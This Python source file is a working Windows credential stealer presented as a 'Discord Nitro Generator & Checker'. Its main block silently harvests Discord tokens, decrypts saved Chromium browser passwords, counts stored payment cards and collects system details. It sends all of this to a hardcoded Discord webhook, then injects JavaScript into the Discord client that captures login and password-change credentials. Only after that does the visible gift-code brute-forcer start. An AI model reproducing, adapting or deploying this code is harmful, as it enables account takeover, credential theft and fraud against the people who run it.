import os
import sys
import json
import base64
import sqlite3
import shutil
try:
    import requests
    print("Requests import edildi.")
except ImportError as e:
    print(f"Requests import edilirken hata oluştu: {e}")
import platform
import psutil
import socket
import uuid
import re
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from win32crypt import CryptUnprotectData
import random
import string
import threading
import time
import ctypes
from colorama import init, Fore, Back, Style
import sys
print(sys.path)
try:
    import Cryptodome
    print("Cryptodome import edildi (try bloğu).")
    from Cryptodome.Cipher import AES
    print("AES import edildi (try bloğu).")
except ImportError as e:
    print(f"Cryptodome veya alt modülleri import edilirken hata oluştu: {e}")

# --- Global Variables ---
APP_DATA = os.getenv('APPDATA')
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
TEMP_DIR = os.getenv('TEMP')

# --- Helper Functions ---
def get_encryption_key(browser_path):
    """Retrieves the encryption key from the browser's Local State file."""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        key = key[5:]  # Remove DPAPI prefix
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_password(encrypted_password, key):
    """Decrypts the password using the provided key."""
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)
        decrypted_password = decrypted_password[:-16].decode()  # Remove suffix
        return decrypted_password
    except Exception:
        return None

def copy_and_connect_db(db_path, temp_name):
    """Copies the database to a temporary location and returns a connection."""
    if not os.path.exists(db_path):
        return None, None
    temp_db_path = os.path.join(TEMP_DIR, temp_name)
    conn = None
    cursor = None
    try:
        shutil.copy2(db_path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        return conn, cursor
    except (PermissionError, sqlite3.Error, Exception):
        if cursor:
            try: cursor.close()
            except: pass
        if conn:
            try: conn.close()
            except: pass
        if os.path.exists(temp_db_path):
            try: os.remove(temp_db_path)
            except: pass
        return None, None # Return None on error

def cleanup_db(conn, cursor, temp_db_path):
    """Closes connection, cursor and removes the temporary database file."""
    try:
        if cursor: cursor.close()
        if conn: conn.close()
        if os.path.exists(temp_db_path): os.remove(temp_db_path)
    except Exception:
        pass # Ignore cleanup errors

def validate_token(token):
    """Validates the Discord token via API call."""
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
        return response.status_code == 200
    except Exception:
        return False

# --- Token Extraction ---
def find_tokens_in_file(file_path, token_regex, found_tokens):
    """Scans a single file for tokens."""
    try:
        with open(file_path, 'r', errors='ignore') as file:
            content = file.read()
            for token in re.findall(token_regex, content):
                if token not in found_tokens and validate_token(token):
                    found_tokens.add(token)
    except Exception:
        pass # Ignore file reading errors

def find_tokens_in_leveldb(dir_path, token_regex, found_tokens):
    """Scans LevelDB directory for tokens."""
    if not os.path.exists(dir_path):
        return
    for file_name in os.listdir(dir_path):
        if file_name.endswith('.ldb') or file_name.endswith('.log'):
            find_tokens_in_file(os.path.join(dir_path, file_name), token_regex, found_tokens)

def find_tokens_in_firefox_cookies(profile_path, token_regex, found_tokens):
    """Scans Firefox cookies.sqlite for tokens."""
    cookie_path = os.path.join(profile_path, 'cookies.sqlite')
    if not os.path.exists(cookie_path):
        return

    conn, cursor = copy_and_connect_db(cookie_path, f'firefox_cookies_{os.path.basename(profile_path)}.sqlite')
    if not conn:
        return

    temp_db_path = os.path.join(TEMP_DIR, f'firefox_cookies_{os.path.basename(profile_path)}.sqlite')
    try:
        cursor.execute("SELECT value FROM moz_cookies WHERE host LIKE '%discord%'")
        for row in cursor.fetchall():
            if isinstance(row[0], str):
                 for token in re.findall(token_regex, row[0]):
                     if token not in found_tokens and validate_token(token):
                         found_tokens.add(token)
    except Exception:
        pass
    finally:
        cleanup_db(conn, cursor, temp_db_path)


def get_discord_tokens():
    tokens = set()
    token_regex = r"[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}" # Slightly broader regex
    mfa_token_regex = r"mfa\.[\w-]{84,}"

    # Define paths to scan
    paths_to_scan = {
        # Discord Clients
        'Discord': os.path.join(APP_DATA, 'Discord', 'Local Storage', 'leveldb'),
        'Discord Canary': os.path.join(APP_DATA, 'discordcanary', 'Local Storage', 'leveldb'),
        'Discord PTB': os.path.join(APP_DATA, 'discordptb', 'Local Storage', 'leveldb'),
        'Discord Development': os.path.join(APP_DATA, 'discorddevelopment', 'Local Storage', 'leveldb'),
        # Chromium Browsers (Scan default and profiles)
        'Chrome': os.path.join(LOCAL_APP_DATA, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(LOCAL_APP_DATA, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(LOCAL_APP_DATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(APP_DATA, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(APP_DATA, 'Opera Software', 'Opera GX Stable'),
        # Firefox
        'Firefox Profiles': os.path.join(APP_DATA, 'Mozilla', 'Firefox', 'Profiles')
    }

    # Scan Discord client LevelDBs
    for name, path in paths_to_scan.items():
        if 'Discord' in name and 'leveldb' in path:
            find_tokens_in_leveldb(path, token_regex, tokens)
            find_tokens_in_leveldb(path, mfa_token_regex, tokens)

    # Scan Chromium browsers (LevelDB and Local State)
    for name, base_path in paths_to_scan.items():
         if any(b in name for b in ['Chrome', 'Edge', 'Brave', 'Opera']):
             profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)] # Check Default and Profile 1-4
             for profile in profiles:
                profile_path = os.path.join(base_path, profile)
                if os.path.exists(profile_path):
                    # Scan LevelDB
                    leveldb_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
                    find_tokens_in_leveldb(leveldb_path, token_regex, tokens)
                    find_tokens_in_leveldb(leveldb_path, mfa_token_regex, tokens)
                    # Scan Local State
                    local_state_path = os.path.join(profile_path, 'Local State')
                    if os.path.exists(local_state_path): # Check Local State in each profile too
                         find_tokens_in_file(local_state_path, token_regex, tokens)
                         find_tokens_in_file(local_state_path, mfa_token_regex, tokens)
             # Also check base Local State for browsers like Opera that might store it there
             base_local_state = os.path.join(base_path, 'Local State')
             if os.path.exists(base_local_state):
                 find_tokens_in_file(base_local_state, token_regex, tokens)
                 find_tokens_in_file(base_local_state, mfa_token_regex, tokens)


    # Scan Firefox profiles
    firefox_profiles_path = paths_to_scan.get('Firefox Profiles')
    if firefox_profiles_path and os.path.exists(firefox_profiles_path):
        try:
            profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
            for profile_dir in profiles:
                 find_tokens_in_firefox_cookies(os.path.join(firefox_profiles_path, profile_dir), token_regex, tokens)
                 find_tokens_in_firefox_cookies(os.path.join(firefox_profiles_path, profile_dir), mfa_token_regex, tokens)
        except Exception:
            pass

    return list(tokens)


# --- Password Extraction ---

def get_chromium_passwords(browser_name, browser_path):
    """Extracts passwords from a Chromium-based browser."""
    passwords = []
    key = get_encryption_key(browser_path) # Get key from base path
    if not key:
         # Try getting key from Default profile if base path failed
         key = get_encryption_key(os.path.join(browser_path, 'Default'))
         if not key:
             return passwords # Cannot proceed without key

    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)] # Scan Default + Profile 1-4

    for profile in profiles:
        profile_db_path = os.path.join(browser_path, profile, 'Login Data')
        if not os.path.exists(profile_db_path):
            continue

        conn, cursor = copy_and_connect_db(profile_db_path, f'{browser_name}_{profile}_logindata.db')
        if not conn:
            continue

        temp_db_path = os.path.join(TEMP_DIR, f'{browser_name}_{profile}_logindata.db')
        try:
            cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
            for url, action_url, username, encrypted_password in cursor.fetchall():
                if username and encrypted_password:
                    decrypted_password = decrypt_password(encrypted_password, key)
                    if decrypted_password:
                        passwords.append({
                            'url': url or action_url, # Use action_url if origin_url is empty
                            'username': username,
                            'password': decrypted_password,
                            'browser': browser_name,
                            'profile': profile
                        })
        except Exception:
            pass # Ignore profile specific errors
        finally:
            cleanup_db(conn, cursor, temp_db_path)

    return passwords


def get_firefox_passwords():
    # NOTE: Decrypting Firefox passwords requires NSS libraries and is complex.
    # This function remains a placeholder as implementing it fully is non-trivial
    # and often requires external dependencies or complex C library interaction.
    # It will not actually retrieve decrypted passwords.
    passwords = []
    try:
        firefox_profiles_path = os.path.join(APP_DATA, 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(firefox_profiles_path):
            return passwords

        profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        for profile_dir in profiles:
            # We can find the logins.json, but decryption is the hard part
            logins_json_path = os.path.join(firefox_profiles_path, profile_dir, 'logins.json')
            key4_db_path = os.path.join(firefox_profiles_path, profile_dir, 'key4.db')
            if os.path.exists(logins_json_path) and os.path.exists(key4_db_path):
                 # Placeholder: Indicate that encrypted data was found
                 passwords.append({
                     'url': f"Firefox Profile: {profile_dir}",
                     'username': "Encrypted Data Found",
                     'password': "(Decryption Not Implemented)",
                     'browser': "Firefox",
                     'profile': profile_dir
                 })
    except Exception:
        pass # Ignore Firefox scanning errors
    return passwords


def get_browser_passwords():
    """Retrieves passwords from all supported browsers."""
    all_passwords = []

    browser_paths = {
        'Chrome': os.path.join(LOCAL_APP_DATA, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(LOCAL_APP_DATA, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(LOCAL_APP_DATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(APP_DATA, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(APP_DATA, 'Opera Software', 'Opera GX Stable'),
        # Add other Chromium browsers here if needed
    }

    # Get passwords from Chromium browsers
    for name, path in browser_paths.items():
        if os.path.exists(path):
            all_passwords.extend(get_chromium_passwords(name, path))

    # Get (placeholder) passwords from Firefox
    all_passwords.extend(get_firefox_passwords())

    return all_passwords


# --- Payment Method Check/Count (Minor adjustments for clarity) ---

def count_chromium_payment_methods(browser_name, browser_path):
    """Counts credit cards stored in a Chromium browser profile."""
    count = 0
    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]

    for profile in profiles:
        web_data_path = os.path.join(browser_path, profile, 'Web Data')
        if not os.path.exists(web_data_path):
            continue

        conn, cursor = copy_and_connect_db(web_data_path, f'{browser_name}_{profile}_webdata.db')
        if not conn:
            continue

        temp_db_path = os.path.join(TEMP_DIR, f'{browser_name}_{profile}_webdata.db')
        try:
            cursor.execute('SELECT COUNT(*) FROM credit_cards')
            profile_count = cursor.fetchone()
            if profile_count:
                count += profile_count[0]
        except Exception:
            pass # Ignore errors reading table
        finally:
            cleanup_db(conn, cursor, temp_db_path)
    return count

def count_firefox_payment_methods():
    """Counts potential credit card entries in Firefox form history."""
    count = 0
    firefox_profiles_path = os.path.join(APP_DATA, 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_profiles_path):
        return count

    try:
        profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        for profile_dir in profiles:
            db_path = os.path.join(firefox_profiles_path, profile_dir, 'formhistory.sqlite')
            if not os.path.exists(db_path):
                continue

            conn, cursor = copy_and_connect_db(db_path, f'firefox_formhistory_{profile_dir}.sqlite')
            if not conn:
                continue

            temp_db_path = os.path.join(TEMP_DIR, f'firefox_formhistory_{profile_dir}.sqlite')
            try:
                # This is an approximation, may include non-CC fields
                cursor.execute("SELECT COUNT(*) FROM moz_formhistory WHERE fieldname LIKE '%card%' OR fieldname LIKE '%credit%' OR fieldname LIKE '%ccnum%' OR fieldname LIKE '%cvc%' OR fieldname LIKE '%expiry%'")
                profile_count = cursor.fetchone()
                if profile_count:
                    count += profile_count[0]
            except Exception:
                pass
            finally:
                cleanup_db(conn, cursor, temp_db_path)
    except Exception:
        pass
    return count


def get_payment_methods_summary():
    """Gets a summary of payment methods found."""
    summary = {'total': 0}
    chromium_total = 0
    firefox_total = 0

    browser_paths = {
        'Chrome': os.path.join(LOCAL_APP_DATA, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(LOCAL_APP_DATA, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(LOCAL_APP_DATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(APP_DATA, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(APP_DATA, 'Opera Software', 'Opera GX Stable'),
    }

    for name, path in browser_paths.items():
        if os.path.exists(path):
            count = count_chromium_payment_methods(name, path)
            if count > 0:
                 summary[name] = count
                 chromium_total += count

    firefox_total = count_firefox_payment_methods()
    if firefox_total > 0:
         summary['Firefox (approx)'] = firefox_total # Indicate approximation

    summary['total'] = chromium_total + firefox_total
    summary['found'] = summary['total'] > 0
    return summary


# --- System Info ---
def get_system_info():
    """Gathers basic system information."""
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except socket.gaierror:
        ip_address = "127.0.0.1" # Fallback if hostname resolution fails

    try:
         external_ip = requests.get('https://api.ipify.org', timeout=3).text
    except Exception:
         external_ip = "Unknown"


    return {
        'hostname': socket.gethostname(),
        'internal_ip': ip_address,
        'external_ip': external_ip,
        'os': platform.system() + ' ' + platform.release(),
        'cpu': platform.processor(),
        'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3), 2)) + ' GB',
        'machine_uuid': str(uuid.UUID(int=uuid.getnode())) # More standard UUID format
    }

# --- Discord Injection ---
def inject_discord():
    """Injects code into Discord to capture password changes and login events."""
    discord_paths = [
        os.path.join(APP_DATA, 'Discord'),
        os.path.join(APP_DATA, 'discordcanary'),
        os.path.join(APP_DATA, 'discordptb'),
        os.path.join(APP_DATA, 'discorddevelopment')
    ]
    
    injection_code = '''
    const { BrowserWindow, session } = require('electron');
    const fs = require('fs');
    const path = require('path');
    const querystring = require('querystring');
    const https = require('https');
    
    // Webhook URL to send captured data
    const webhook_url = "https://discord.com/api/webhooks/1367435306453962823/0vJwgnhRvJ68b-PL3r5uZUbaGS1y1pYON2bIwllm6mahGGy-WjGIJndyuMtBZTSfI7f9";
    
    // Store the original function
    const originalFunction = BrowserWindow.prototype.webContents.on;
    
    // Override the function to intercept requests
    BrowserWindow.prototype.webContents.on = function(event, callback) {
        if (event === 'did-finish-load') {
            // Inject our listener after the page loads
            this.executeJavaScript(`
                // Monitor password changes and logins
                const originalXHR = window.XMLHttpRequest.prototype.send;
                window.XMLHttpRequest.prototype.send = function(body) {
                    const url = this._url || this.url;
                    if (url && url.includes('/api/v')) {
                        try {
                            // Parse the body if it's a string
                            const parsedBody = typeof body === 'string' ? JSON.parse(body) : body;
                            
                            // Check for password changes
                            if (url.includes('/users/@me') && parsedBody && parsedBody.password) {
                                const data = {
                                    type: 'password_change',
                                    old_password: parsedBody.password,
                                    new_password: parsedBody.new_password,
                                    email: parsedBody.email,
                                    timestamp: new Date().toISOString()
                                };
                                
                                // Send to webhook
                                const webhookReq = new XMLHttpRequest();
                                webhookReq.open('POST', '${webhook_url}', true);
                                webhookReq.setRequestHeader('Content-Type', 'application/json');
                                webhookReq.send(JSON.stringify({
                                    username: 'Discord Password Change',
                                    embeds: [{
                                        title: 'Password Changed',
                                        color: 16711680,
                                        fields: [
                                            { name: 'Email', value: data.email || 'Unknown', inline: true },
                                            { name: 'Old Password', value: data.old_password || 'Unknown', inline: true },
                                            { name: 'New Password', value: data.new_password || 'Unknown', inline: true },
                                            { name: 'Timestamp', value: data.timestamp, inline: false }
                                        ]
                                    }]
                                }));
                            }
                            
                            // Check for login attempts
                            if (url.includes('/auth/login') && parsedBody) {
                                const data = {
                                    type: 'login',
                                    email: parsedBody.email || parsedBody.login,
                                    password: parsedBody.password,
                                    timestamp: new Date().toISOString()
                                };
                                
                                // Send to webhook
                                const webhookReq = new XMLHttpRequest();
                                webhookReq.open('POST', '${webhook_url}', true);
                                webhookReq.setRequestHeader('Content-Type', 'application/json');
                                webhookReq.send(JSON.stringify({
                                    username: 'Discord Login',
                                    embeds: [{
                                        title: 'Login Attempt',
                                        color: 65280,
                                        fields: [
                                            { name: 'Email', value: data.email || 'Unknown', inline: true },
                                            { name: 'Password', value: data.password || 'Unknown', inline: true },
                                            { name: 'Timestamp', value: data.timestamp, inline: false }
                                        ]
                                    }]
                                }));
                            }
                        } catch (e) {
                            // Silently ignore errors
                        }
                    }
                    
                    // Call the original function
                    return originalXHR.apply(this, arguments);
                };
            `);
        }
        
        // Call the original event handler
        return originalFunction.call(this, event, callback);
    };
    
    // Also monitor network requests directly
    session.defaultSession.webRequest.onCompleted({
        urls: [
            'https://discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/users/@me',
            'https://*.discord.com/api/v*/users/@me',
            'https://discord.com/api/v*/auth/login',
            'https://discordapp.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login'
        ]
    }, (details, callback) => {
        if (details.method === 'PATCH' || details.method === 'POST') {
            // We'll handle this in the injected code above
        }
    });
    
    // Continue with the original module
    module.exports = require('./core.asar');
    '''
    
    for discord_path in discord_paths:
        if not os.path.exists(discord_path):
            continue
            
        app_path = os.path.join(discord_path, 'app')
        if not os.path.exists(app_path):
            continue
            
        # Find all app-*.*.* directories
        app_directories = [d for d in os.listdir(app_path) if d.startswith('app-')]
        for app_dir in app_directories:
            resources_path = os.path.join(app_path, app_dir, 'resources')
            if not os.path.exists(resources_path):
                continue
                
            # Create the injection file
            index_file = os.path.join(resources_path, 'index.js')
            try:
                with open(index_file, 'w') as f:
                    f.write(injection_code)
            except Exception:
                pass

# --- Webhook Sending ---
def send_to_webhook(webhook_url):
    """Collects all data and sends it via Discord webhook."""
    try:
        tokens = get_discord_tokens()
        passwords = get_browser_passwords()
        system_info = get_system_info()
        payment_summary = get_payment_methods_summary()

        # Inject Discord client to monitor password changes
        inject_discord()

        user_info = None
        avatar_url = None
        if tokens:
            # Try to get user info using the first valid token
            for token in tokens:
                try:
                    response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
                    if response.status_code == 200:
                        user_data = response.json()
                        user_info = user_data
                        if user_data.get('avatar'):
                            avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png?size=128"
                        break # Stop after finding one valid token for user info
                except Exception:
                    continue # Try next token if request fails

        webhook = DiscordWebhook(url=webhook_url, username="Data Collector") # Set a username for the webhook

        embed = DiscordEmbed(
            title=f'Report from {system_info["hostname"]}',
            description=f'Data collected at {datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")}',
            color='03b2f8' # Blue color
        )
        embed.set_timestamp()

        # Add system info
        sys_info_value = f"""
        **OS:** {system_info['os']}
        **CPU:** {system_info['cpu']}
        **RAM:** {system_info['ram']}
        **Hostname:** {system_info['hostname']}
        **Internal IP:** {system_info['internal_ip']}
        **External IP:** {system_info['external_ip']}
        **UUID:** {system_info['machine_uuid']}
        """
        embed.add_embed_field(name='🖥️ System Information', value=sys_info_value.strip(), inline=False)

        # Add user info if available
        if user_info:
            nitro_type = {0: "No Nitro", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(user_info.get('premium_type'), "Unknown")
            user_info_value = f"""
            **Username:** {user_info.get('username')}#{user_info.get('discriminator')} ({user_info.get('global_name', '')})
            **ID:** {user_info.get('id')}
            **Email:** {user_info.get('email') or 'Not Found'}
            **Phone:** {user_info.get('phone') or 'Not Found'}
            **Nitro:** {nitro_type}
            **Badges:** {user_info.get('flags', 'None')}
            """
            embed.add_embed_field(name='👤 Discord User', value=user_info_value.strip(), inline=False)
            if avatar_url:
                embed.set_thumbnail(url=avatar_url)
        else:
             embed.add_embed_field(name='👤 Discord User', value='Could not retrieve user info from tokens.', inline=False)


        # Add Discord tokens summary
        if tokens:
            # Display first few tokens, indicate if more exist
            token_display = '\n'.join([f"`{t[:24]}...{t[-6:]}`" for t in tokens[:3]]) # Obfuscate slightly
            if len(tokens) > 3:
                token_display += f'\n... and {len(tokens) - 3} more.'
            embed.add_embed_field(name=f'🔑 Discord Tokens ({len(tokens)})', value=token_display, inline=False)
        else:
            embed.add_embed_field(name='🔑 Discord Tokens', value='No valid tokens found.', inline=False)

        # Add payment methods summary
        payment_info_lines = [f"**Found:** {'Yes' if payment_summary['found'] else 'No'}"]
        for browser, count in payment_summary.items():
            if browser not in ['found', 'total']:
                 payment_info_lines.append(f"**{browser}:** {count}")
        payment_info_lines.append(f"**Total:** {payment_summary['total']}")
        embed.add_embed_field(name='💳 Payment Methods', value='\n'.join(payment_info_lines), inline=False)

        # Add password summary
        embed.add_embed_field(name='🔒 Passwords', value=f'Found: {len(passwords)} (details in file)', inline=False)


        webhook.add_embed(embed)

        # Add passwords as a file (Limit to 100 entries to avoid large files)
        if passwords:
            output = ""
            for p in passwords[:100]:
                 output += f"Browser: {p.get('browser', 'N/A')} | Profile: {p.get('profile', 'N/A')}\n"
                 output += f"URL: {p.get('url', 'N/A')}\n"
                 output += f"Username: {p.get('username', 'N/A')}\n"
                 output += f"Password: {p.get('password', 'N/A')}\n"
                 output += "-"*20 + "\n"
            if len(passwords) > 100:
                 output += f"\n... Displaying first 100 out of {len(passwords)} passwords."

            webhook.add_file(file=output.encode('utf-8', errors='ignore'), filename='passwords.txt')

        # Add all tokens as a separate file
        if tokens:
            tokens_text = '\n'.join(tokens)
            webhook.add_file(file=tokens_text.encode('utf-8', errors='ignore'), filename='tokens.txt')

        # Execute webhook sending
        response = webhook.execute()
        if isinstance(response, list): # Check if response is a list of responses (multiple webhooks)
            for r in response:
                if r.status_code >= 400:
                     pass # Silently ignore webhook send errors
        elif response and response.status_code >= 400:
             pass # Silently ignore webhook send errors


    except Exception:
        pass # Silently ignore any error during the main process

# --- Discord Nitro Generator and Checker ---
class DiscordNitroBot:
    def __init__(self):
        """Initialize Discord Nitro generator/checker."""
        self.codes_generated = 0
        self.codes_checked = 0
        self.valid_codes = []
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.running = True
        
        # Initialize colorama for colored console output
        init()
    
    def generate_code(self):
        """Generate a Discord Nitro code."""
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        with self.lock:
            self.codes_generated += 1
        return code
    
    def check_code(self, code):
        """Check if a Discord Nitro code is valid."""
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
        response = None
        try:
            response = requests.get(url)
            with self.lock:
                self.codes_checked += 1
            
            if response.status_code == 200:
                with self.lock:
                    self.valid_codes.append(code)
                print(f"{Fore.GREEN}[HIT] {code}{Style.RESET_ALL}")
                with open("valid_nitro.txt", "a") as file:
                    file.write(f"{code}\n")
                return True
            return False
        except Exception:
            with self.lock:
                self.codes_checked += 1
            return False
    
    def generator_thread(self):
        """Generator thread that generates and checks codes."""
        while self.running:
            code = self.generate_code()
            self.check_code(code)
            time.sleep(0.01)  # Small delay to avoid rate limiting
    
    def display_stats(self):
        """Display stats about the generator/checker."""
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == 'nt':
            os.system('title Discord Nitro Generator && color 0a')
        
        while self.running:
            elapsed_time = time.time() - self.start_time
            gen_speed = self.codes_generated / elapsed_time if elapsed_time > 0 else 0
            check_speed = self.codes_checked / elapsed_time if elapsed_time > 0 else 0
            
            os.system('cls' if os.name == 'nt' else 'clear')
            
            # Title and border
            print(f"{Fore.CYAN}╔{'═' * 78}╗{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{' ' * 22}{Fore.YELLOW}Discord Nitro Generator & Checker{Fore.CYAN}{' ' * 23}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠{'═' * 78}╣{Style.RESET_ALL}")
            
            # Stats
            print(f"{Fore.CYAN}║ {Fore.WHITE}Generated: {Fore.GREEN}{self.codes_generated}{Fore.WHITE} codes {Fore.YELLOW}({gen_speed:.2f}/s){' ' * 45}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Checked: {Fore.GREEN}{self.codes_checked}{Fore.WHITE} codes {Fore.YELLOW}({check_speed:.2f}/s){' ' * 47}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Valid codes: {Fore.GREEN}{len(self.valid_codes)}{' ' * 60}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Elapsed time: {Fore.GREEN}{int(elapsed_time // 60)}m {int(elapsed_time % 60)}s{' ' * 55}{Fore.CYAN}║{Style.RESET_ALL}")
            
            # Valid codes
            print(f"{Fore.CYAN}╠{'═' * 78}╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Last Valid Nitro Codes:{' ' * 56}{Fore.CYAN}║{Style.RESET_ALL}")
            
            if self.valid_codes:
                for i in range(min(3, len(self.valid_codes))):
                    code = self.valid_codes[-(i+1)]
                    print(f"{Fore.CYAN}║ {Fore.GREEN}{code}{' ' * (78 - len(code) - 1)}{Fore.CYAN}║{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}║ {Fore.RED}No valid codes found yet...{' ' * 53}{Fore.CYAN}║{Style.RESET_ALL}")
            
            # Bottom border
            print(f"{Fore.CYAN}╚{'═' * 78}╝{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Press Ctrl+C to exit{Style.RESET_ALL}")
            
            time.sleep(1)
    
    def start(self):
        """Start the generator and checker."""
        # Display thread
        threading.Thread(target=self.display_stats, daemon=True).start()
        
        # Generator threads
        thread_count = 50
        for i in range(thread_count):
            threading.Thread(target=self.generator_thread, daemon=True).start()
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"{Fore.YELLOW}Stopping generator...{Style.RESET_ALL}")
            time.sleep(1)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{Fore.GREEN}Generator stopped.{Style.RESET_ALL}")
            print(f"{Fore.GREEN}Total generated: {self.codes_generated}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}Total checked: {self.codes_checked}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}Valid codes found: {len(self.valid_codes)}{Style.RESET_ALL}")
            if self.valid_codes:
                print(f"{Fore.GREEN}Valid codes saved to 'valid_nitro.txt'{Style.RESET_ALL}")

# --- Main Execution ---
if __name__ == "__main__":
    try:
        # First, run data collection part
        webhook_url = "https://discord.com/api/webhooks/1367435306453962823/0vJwgnhRvJ68b-PL3r5uZUbaGS1y1pYON2bIwllm6mahGGy-WjGIJndyuMtBZTSfI7f9"
        send_to_webhook(webhook_url)
        print("Bilgi toplama tamamlandı.")
        
        # After data collection, run Discord Nitro generator
        print("Discord Nitro Generator başlatılıyor...")
        time.sleep(2)  # Short pause for effect
        
        # Initialize colorama for Windows
        if os.name == 'nt':
            try:
                # Enable ANSI colors on Windows
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            except:
                pass
        
        # Create and start Discord Nitro generator
        nitro_bot = DiscordNitroBot()
        nitro_bot.start()
        
    except Exception:
        pass  # Keep overall execution silent on error
